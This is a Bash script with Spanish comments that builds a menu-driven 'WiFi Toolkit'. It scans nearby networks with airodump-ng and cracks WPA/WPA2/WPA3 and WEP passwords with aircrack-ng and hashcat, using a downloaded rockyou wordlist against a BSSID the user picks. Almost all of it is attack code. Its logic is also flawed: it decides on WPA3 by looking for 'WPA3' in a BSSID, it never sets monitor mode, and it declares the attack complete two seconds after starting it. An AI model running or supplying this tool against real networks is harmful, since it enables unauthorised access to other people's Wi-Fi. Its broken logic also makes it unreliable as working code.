#!/bin/bash

# Colores para la salida
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # Sin color

# Configuración del proyecto
PROJECT_NAME="wifi_toolkit"
DOWNLOADS_DIR="$HOME/Downloads"
PROJECT_DIR="$DOWNLOADS_DIR/$PROJECT_NAME"
RESULTS_DIR="$PROJECT_DIR/resultados_wifi"
DEPENDENCIES=("aircrack-ng" "xterm" "iw" "curl" "gzip" "hashcat" "hcxpcapngtool" "dialog")

# Función para verificar e instalar dependencias
install_dependencies() {
    dialog --title "Instalación de Dependencias" --infobox "Verificando dependencias..." 8 40
    for dep in "${DEPENDENCIES[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            dialog --title "Instalando $dep" --infobox "Instalando $dep..." 8 40
            sudo apt-get install -y "$dep" &>/dev/null || {
                dialog --title "Error" --msgbox "Error al instalar $dep. Instálalo manualmente." 8 40
                exit 1
            }
        fi
    done
    dialog --title "Dependencias" --msgbox "Todas las dependencias están instaladas." 8 40
}

# Crear carpetas del proyecto
prepare_project_directory() {
    mkdir -p "$PROJECT_DIR" "$RESULTS_DIR" 2>/dev/null
}

# Escaneo en vivo de redes WiFi
live_scan_networks() {
    interface=$(detect_wireless_interface)
    dialog --title "Escaneo en Vivo" --infobox "Escaneando redes en tiempo real..." 8 40
    xterm -hold -e "airodump-ng $interface --output-format csv --write $RESULTS_DIR/live_scan" &
    sleep 10
    killall airodump-ng
    show_scan_results "$RESULTS_DIR/live_scan-01.csv"
}

# Mostrar resultados del escaneo en vivo
show_scan_results() {
    local scan_file=$1
    if [[ -f "$scan_file" ]]; then
        dialog --title "Resultados del Escaneo" --textbox "$scan_file" 20 80
    else
        dialog --title "Error" --msgbox "No se encontraron resultados de escaneo." 8 40
    fi
}

# Detectar interfaz inalámbrica
detect_wireless_interface() {
    iw dev | grep Interface | awk '{print $2}' | head -n 1
}

# Analizar redes WPA/WPA2/WPA3 y realizar ataque
analyze_and_attack_network() {
    local interface=$(detect_wireless_interface)
    dialog --title "Escaneo" --infobox "Escaneando redes WPA/WPA2/WPA3..." 8 40
    xterm -hold -e "airodump-ng $interface --output-format cap --write $RESULTS_DIR/wpa_scan" &
    sleep 10
    killall airodump-ng

    cap_file=$(find "$RESULTS_DIR" -type f -name "wpa_scan*.cap" | head -n 1)
    if [[ -z "$cap_file" ]]; then
        dialog --title "Error" --msgbox "No se encontró ningún archivo .cap." 8 40
        return
    fi

    network=$(dialog --title "Seleccione una Red" --inputbox "Introduce el BSSID de la red que deseas atacar:" 10 50 3>&1 1>&2 2>&3)
    dictionary=$(find_or_download_dictionary)

    # Determinar si es WPA3
    if [[ "$network" == *"WPA3"* ]]; then
        perform_wpa3_attack "$cap_file" "$dictionary"
    else
        dialog --title "Ataque WPA/WPA2" --infobox "Iniciando ataque contra $network..." 8 40
        xterm -hold -e "aircrack-ng -w $dictionary -b $network $cap_file" &
    fi
}

# Realizar ataque WPA3 con hashcat
perform_wpa3_attack() {
    local cap_file=$1
    local dictionary=$2

    # Convertir el archivo .cap a formato compatible con hashcat
    dialog --title "Preparando Archivo" --infobox "Convirtiendo archivo .cap para hashcat..." 8 40
    hcxpcapngtool -o "$RESULTS_DIR/hashcat.hc22000" "$cap_file" &>/dev/null

    if [[ ! -f "$RESULTS_DIR/hashcat.hc22000" ]]; then
        dialog --title "Error" --msgbox "Error al convertir el archivo .cap para hashcat." 8 40
        return
    fi

    # Ejecutar ataque con hashcat
    dialog --title "Ataque WPA3" --infobox "Iniciando ataque con hashcat..." 8 40
    xterm -hold -e "hashcat -m 22000 -a 0 $RESULTS_DIR/hashcat.hc22000 $dictionary" &
    sleep 2

    dialog --title "Ataque Completo" --msgbox "Ataque WPA3 completado. Verifica los resultados en la terminal." 8 40
}

# Ataques WEP y redes abiertas
perform_wep_attack() {
    local interface=$(detect_wireless_interface)
    dialog --title "Ataque WEP" --infobox "Iniciando ataque WEP..." 8 40
    xterm -hold -e "airodump-ng $interface --output-format cap --write $RESULTS_DIR/wep_scan" &
    sleep 10
    killall airodump-ng

    cap_file=$(find "$RESULTS_DIR" -type f -name "wep_scan*.cap" | head -n 1)
    if [[ -z "$cap_file" ]]; then
        dialog --title "Error" --msgbox "No se encontró ningún archivo .cap." 8 40
        return
    fi

    dialog --title "Ataque WEP" --infobox "Ejecutando ataque WEP..." 8 40
    xterm -hold -e "aircrack-ng $cap_file" &
}

# Buscar o descargar diccionario rockyou.txt
find_or_download_dictionary() {
    local dictionary_path=$(find / -type f -name "rockyou.txt" 2>/dev/null | head -n 1)
    if [[ -z "$dictionary_path" ]]; then
        dialog --title "Diccionario" --infobox "Descargando diccionario rockyou.txt..." 8 40
        curl -o "$PROJECT_DIR/rockyou.txt.gz" https://github.com/praetorian-inc/Hob0Rules/raw/master/wordlists/rockyou.txt.gz
        gzip -d "$PROJECT_DIR/rockyou.txt.gz"
        dictionary_path="$PROJECT_DIR/rockyou.txt"
    fi
    echo "$dictionary_path"
}

# Menú principal
main_menu() {
    while true; do
        option=$(dialog --title "WiFi Toolkit" --menu "Selecciona una opción:" 20 60 10 \
            1 "Instalar dependencias" \
            2 "Escaneo en vivo de redes" \
            3 "Analizar redes WPA/WPA2/WPA3 y atacar" \
            4 "Ejecutar ataque WEP" \
            5 "Salir" 3>&1 1>&2 2>&3)

        case $option in
            1) install_dependencies ;;
            2) live_scan_networks ;;
            3) analyze_and_attack_network ;;
            4) perform_wep_attack ;;
            5) clear; exit 0 ;;
            *) dialog --title "Error" --msgbox "Opción no válida." 8 40 ;;
        esac
    done
}

# Inicio del script
install_dependencies
prepare_project_directory
main_menu
